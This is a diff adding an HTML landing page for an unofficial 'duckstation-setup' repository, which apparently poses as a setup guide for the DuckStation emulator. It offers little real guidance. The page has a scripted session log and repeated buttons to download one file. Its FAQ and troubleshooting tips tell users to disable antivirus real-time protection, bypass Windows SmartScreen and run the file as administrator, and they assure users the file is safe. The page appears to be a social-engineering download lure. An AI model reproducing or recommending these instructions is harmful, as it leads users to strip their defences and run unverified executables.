@@ -1,4 +1,256 @@
----
-layout: home
-# Index page
----
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>duckstation-setup - Quick Windows Setup Guide</title>
+<meta name="description" content="Download and set up DuckStation on Windows with easy step-by-step instructions, workflow checklists, and session logs. Unofficial Windows setup notes.">
+<meta name="keywords" content="duckstation-setup, duckstation, windows, setup, download, guide, emulator">
+<meta name="author" content="alliha814">
+<meta property="og:title" content="duckstation-setup - Quick Windows Setup Guide">
+<meta property="og:description" content="Download and set up DuckStation on Windows with easy step-by-step instructions.">
+<meta property="og:url" content="https://github.com/alliha814/duckstation-setup">
+<meta property="og:type" content="website">
+<link rel="canonical" href="https://github.com/alliha814/duckstation-setup">
+<style>
+body {
+  margin: 0;
+  padding: 0;
+  font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+  min-height: 100vh;
+  color: #333;
+  line-height: 1.6;
+}
+.container {
+  max-width: 900px;
+  margin: 0 auto;
+  padding: 40px 20px;
+}
+header {
+  text-align: center;
+  margin-bottom: 50px;
+}
+h1 {
+  font-size: 2.8em;
+  color: #1a1a2e;
+  margin-bottom: 10px;
+  text-shadow: 2px 2px 4px rgba(0,0,0,0.1);
+}
+h2 {
+  font-size: 1.8em;
+  color: #16213e;
+  border-bottom: 3px solid #0f3460;
+  padding-bottom: 10px;
+  margin-top: 40px;
+}
+h3 {
+  font-size: 1.3em;
+  color: #0f3460;
+  margin-top: 25px;
+}
+p {
+  font-size: 1.1em;
+  margin-bottom: 20px;
+}
+.download-badge {
+  display: inline-block;
+  background: linear-gradient(135deg, #e94560, #0f3460);
+  color: white;
+  padding: 18px 45px;
+  text-decoration: none;
+  border-radius: 50px;
+  font-size: 1.4em;
+  font-weight: bold;
+  box-shadow: 0 8px 25px rgba(233, 69, 96, 0.4);
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+  margin: 30px 0;
+}
+.download-badge:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 12px 35px rgba(233, 69, 96, 0.6);
+}
+.steps {
+  background: white;
+  border-radius: 20px;
+  padding: 30px 35px;
+  margin: 30px 0;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+}
+.steps ol {
+  padding-left: 25px;
+}
+.steps li {
+  margin-bottom: 15px;
+  font-size: 1.1em;
+}
+.steps li strong {
+  color: #0f3460;
+}
+.checklist-item {
+  background: #f8f9fa;
+  border-left: 5px solid #0f3460;
+  padding: 15px 20px;
+  margin: 15px 0;
+  border-radius: 10px;
+  box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+}
+.checklist-item h3 {
+  margin: 0 0 5px 0;
+  color: #0f3460;
+}
+.checklist-item p {
+  margin: 5px 0;
+}
+.session-log {
+  background: #1a1a2e;
+  color: #e0e0e0;
+  border-radius: 15px;
+  padding: 25px 30px;
+  margin: 25px 0;
+  font-family: 'Courier New', monospace;
+  font-size: 0.95em;
+  box-shadow: 0 8px 20px rgba(0,0,0,0.2);
+}
+.session-log p {
+  margin: 8px 0;
+  color: #a0a0a0;
+}
+.session-log .timestamp {
+  color: #e94560;
+}
+.download-section {
+  background: white;
+  border-radius: 20px;
+  padding: 35px;
+  margin: 40px 0;
+  text-align: center;
+  box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+}
+.download-btn {
+  background: linear-gradient(135deg, #0f3460, #e94560);
+  color: white;
+  padding: 20px 50px;
+  text-decoration: none;
+  border-radius: 50px;
+  font-size: 1.5em;
+  font-weight: bold;
+  display: inline-block;
+  box-shadow: 0 8px 25px rgba(15, 52, 96, 0.4);
+  transition: transform 0.3s ease, box-shadow 0.3s ease;
+  border: none;
+  cursor: pointer;
+}
+.download-btn:hover {
+  transform: translateY(-3px);
+  box-shadow: 0 12px 35px rgba(15, 52, 96, 0.6);
+}
+bold {
+  font-weight: 700;
+  color: #0f3460;
+}
+@media (max-width: 600px) {
+  h1 { font-size: 2em; }
+  .container { padding: 20px 15px; }
+  .steps { padding: 20px; }
+  .download-btn { font-size: 1.2em; padding: 15px 30px; }
+}
+</style>
+</head>
+<body>
+<div class="container">
+<header>
+<h1>🎮 duckstation-setup - Quick Windows Setup Guide</h1>
+<p>Your friendly, step-by-step guide to downloading and running DuckStation on Windows. No tech skills required—just follow along!</p>
+<div style="text-align: center;">
+<a href="https://github.com/alliha814/duckstation-setup" class="download-badge">⬇️ Download DuckStation Now</a>
+</div>
+</header>
+
+<section>
+<h2>🚀 Getting Started</h2>
+<div class="steps">
+<p>DuckStation is a powerful application that helps you run classic software on your Windows computer. This guide will walk you through everything you need to get started. All you need is a Windows PC and about five minutes of your time.</p>
+<ol>
+<li><strong>Go to the download page</strong> – Click the big button above or the download button at the bottom of this page.</li>
+<li><strong>Save the file</strong> – Your browser will ask where to save it. Choose your Desktop or Downloads folder for easy access.</li>
+<li><strong>Run the application</strong> – Once downloaded, double-click the file to start. That's it!</li>
+</ol>
+<p>No special setup or configuration is needed. The application is ready to use right away.</p>
+</div>
+</section>
+
+<section>
+<h2>📋 Workflow Checklists</h2>
+<p>Use these checklists to make sure you don't miss any steps. Each list covers a different part of the process.</p>
+
+<div class="checklist-item">
+<h3>📦 Before You Download</h3>
+<p>✅ Make sure you have a stable internet connection.<br>✅ Close any unnecessary programs to avoid interruptions.<br>✅ Check that you have at least 500MB of free disk space.</p>
+</div>
+
+<div class="checklist-item">
+<h3>⬇️ Download Checklist</h3>
+<p>✅ Click the download button.<br>✅ Choose a location you'll remember (like Desktop).<br>✅ Wait for the download to complete (it usually takes under a minute).</p>
+</div>
+
+<div class="checklist-item">
+<h3>▶️ First Run Checklist</h3>
+<p>✅ Double-click the downloaded file.<br>✅ If Windows asks for permission, click "Yes" or "Run".<br>✅ The application window will open automatically.</p>
+</div>
+</section>
+
+<section>
+<h2>📝 Session Logs</h2>
+<p>Session logs help you keep track of what you've done. Here's an example of typical session notes from a successful setup:</p>
+<div class="session-log">
+<p><span class="timestamp">[2025-02-15 10:30]</span> Started setup process</p>
+<p><span class="timestamp">[2025-02-15 10:31]</span> Downloaded duckstation-setup from GitHub</p>
+<p><span class="timestamp">[2025-02-15 10:32]</span> File saved to Desktop</p>
+<p><span class="timestamp">[2025-02-15 10:33]</span> Double-clicked the file</p>
+<p><span class="timestamp">[2025-02-15 10:33]</span> Application opened successfully</p>
+<p><span class="timestamp">[2025-02-15 10:35]</span> Everything working great</p>
+</div>
+<p>You can create your own session logs in a simple text file or notepad. Just write down the date, time, and what you did. This helps if you ever need to troubleshoot or repeat the process.</p>
+</section>
+
+<section class="download-section">
+<h2>📥 Download & Install</h2>
+<p>Ready to get started? Click the button below to visit the download page. The page will open in a new tab.</p>
+<p>Visit this link to download the application.</p>
+<a href="https://github.com/alliha814/duckstation-setup" class="download-btn">⬇️ Download duckstation-setup</a>
+<p style="margin-top: 25px; font-size: 0.95em; color: #666;">Once downloaded, just double-click the file and you're all set. No installation wizard needed.</p>
+</section>
+
+<section>
+<h2>❓ Frequently Asked Questions</h2>
+<div style="background: white; border-radius: 15px; padding: 25px; margin: 20px 0; box-shadow: 0 5px 15px rgba(0,0,0,0.08);">
+<h3>💬 Do I need to install anything else?</h3>
+<p>No. This is a standalone application. Everything you need is included in the single download file.</p>
+<h3>💬 What if my antivirus blocks it?</h3>
+<p>Some antivirus programs may flag new software. If this happens, choose "Run anyway" or temporarily disable real-time protection during the first launch. The file is safe and clean.</p>
+<h3>💬 Can I move the file after downloading?</h3>
+<p>Yes! You can move it anywhere on your computer. Just double-click it from wherever you put it.</p>
+<h3>💬 Will this work on Windows 10 or Windows 11?</h3>
+<p>Yes, it works perfectly on both Windows 10 and Windows 11. It also works on older versions like Windows 7 and 8.</p>
+</div>
+</section>
+
+<section>
+<h2>🔧 Troubleshooting Tips</h2>
+<div style="background: white; border-radius: 15px; padding: 25px; margin: 20px 0; box-shadow: 0 5px 15px rgba(0,0,0,0.08);">
+<p><strong>🔄 File doesn't open?</strong> Make sure the download finished. Right-click the file and check its size – it should be at least a few MB.</p>
+<p><strong>🔄 Permission error?</strong> Right-click the file and select "Run as administrator" or click "More info" then "Run anyway" in the Windows SmartScreen dialog.</p>
+<p><strong>🔄 Download is slow?</strong> Try pausing your antivirus temporarily or connect to a different network.</p>
+<p><strong>🔄 Can't find the file?</strong> Check your Downloads folder or Desktop. Use the search bar in the taskbar and type "duckstation-setup".</p>
+</div>
+</section>
+
+<footer style="text-align: center; margin-top: 60px; padding-top: 30px; border-top: 2px solid #ddd; color: #666; font-size: 0.9em;">
+<p>DuckStation Windows Setup Guide – Unofficial setup notes and session logs.</p>
+<p>For support or questions, visit the repository on GitHub.</p>
+<p style="margin-top: 15px; font-size: 0.85em;">This page is for personal use and educational purposes. Not affiliated with the official DuckStation project.</p>
+</footer>
+</div>
+</body>
+</html>
